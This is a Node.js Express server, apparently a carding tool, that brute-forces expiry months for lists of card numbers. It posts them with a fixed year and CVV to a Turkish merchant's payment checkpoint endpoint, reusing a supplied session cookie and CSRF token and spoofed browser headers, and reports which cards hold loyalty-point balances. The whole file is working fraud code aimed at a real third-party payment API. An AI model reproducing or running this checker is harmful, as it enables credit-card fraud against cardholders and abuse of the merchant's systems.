// server.js
const express = require('express');
const { URLSearchParams } = require('url');
const fetch = require('node-fetch');
const cors = require('cors'); 
const app = express();
// Render için portu dinamikleştiriyoruz: process.env.PORT
const port = process.env.PORT || 3000; 

// Sabitler
const API_URL = "https://www.happy.com.tr/index.php?route=payment/creditcard/checkPoint";
const FIXED_YEAR = "2028";
const FIXED_CVV = "000";

// Orta katmanlar (Middleware)
app.use(cors());
app.use(express.json()); 
app.use(express.urlencoded({ extended: true }));

/**
 * Kartı belirtilen ay ve yıl için kontrol eder.
 * @param {string} cardNumber Kontrol edilecek kart numarası.
 * @param {string} month Kontrol edilecek ay (01-12).
 * @param {string} year Kontrol edilecek yıl.
 * @param {Object} headers API çağrısı için dinamik HTTP başlıkları (Cookie içerir).
 * @param {string} csrfToken POST verisi içine konulacak CSRF değeri.
 * @returns {Promise<Object>} Puan durumunu içeren bir nesne.
 */
async function checkCard(cardNumber, month, year, headers, csrfToken) {
    const data = {
        "banka": "akbank",
        "cardtype": "2",
        "cardname": "axess",
        "cc_cvv": FIXED_CVV,
        "taksit_sec": "1",
        "cc_number": cardNumber,
        "cc_month": month,
        "cc_year": year,
        "useAmountInt": "",
        "useAmountDecimal": "",
        "csrfToken": csrfToken // Dinamik olarak alınıyor
    };

    const body = new URLSearchParams(data).toString();

    try {
        const response = await fetch(API_URL, {
            method: 'POST',
            headers: headers,
            body: body
        });

        const text = await response.text();
        
        try {
            const result = JSON.parse(text);
            if (result && typeof result.amount === 'string' && parseFloat(result.amount) > 0) {
                return { 
                    success: true, 
                    message: `✅ ${result.amount} Puan Bulundu!`,
                    amount: result.amount
                };
            }
        } catch (jsonError) {
            // JSON parse hatası 
        }
    } catch (fetchError) {
        // Network hatası
        return { 
            success: false, 
            message: `⚠️ Bağlantı hatası: ${fetchError.message}`, 
            amount: null 
        };
    }
    
    return { success: false, message: "❌ Bu kart buz gibi...", amount: null };
}

/**
 * Express POST Rotası: Kart kontrol işlemini yapar
 */
app.post('/check_cards', async (req, res) => {
    const inputCards = req.body.cards;
    
    // Ön yüzden gönderilen özel HTTP başlıklarını yakala
    const cookieHeader = req.header('x-app-cookie');
    const csrfTokenValue = req.header('x-app-csrf');

    if (!cookieHeader || !csrfTokenValue) {
        return res.status(400).json({ error: "Oturum bilgileri (Cookie/CSRF) eksik. Lütfen ayarları kontrol edin." });
    }

    // Dinamik HTTP başlık nesnesini oluştur
    const dynamicHeaders = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": cookieHeader,
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Origin": "https://www.happy.com.tr",
        "Referer": "https://www.happy.com.tr/index.php?route=checkout/checkout",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "X-Requested-With": "XMLHttpRequest"
    };
    
    const robustCards = [];

    // Kartları sırayla döngüye al ve 12'den 1'e kadar ardışık dene
    for (const card of inputCards) {
        for (let m = 12; m >= 1; m--) {
            const month = m.toString().padStart(2, '0');

            const result = await checkCard(card, month, FIXED_YEAR, dynamicHeaders, csrfTokenValue); 
            
            if (result.success) {
                robustCards.push({ 
                    cardNumber: card, 
                    expiry: `${month}/${FIXED_YEAR}`,
                    amount: result.amount,
                    message: result.message
                });
                break; // Puan bulundu, kalan ayları deneme
            }
        }
    }

    res.json({
        totalChecked: inputCards.length,
        robustCards: robustCards
    });
});


// Statik dosyaları (index.html) sunmak için kök dizini ayarla
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.listen(port, () => {
    console.log(`🚀 Node.js Sunucusu port ${port} adresinde çalışıyor...`);
});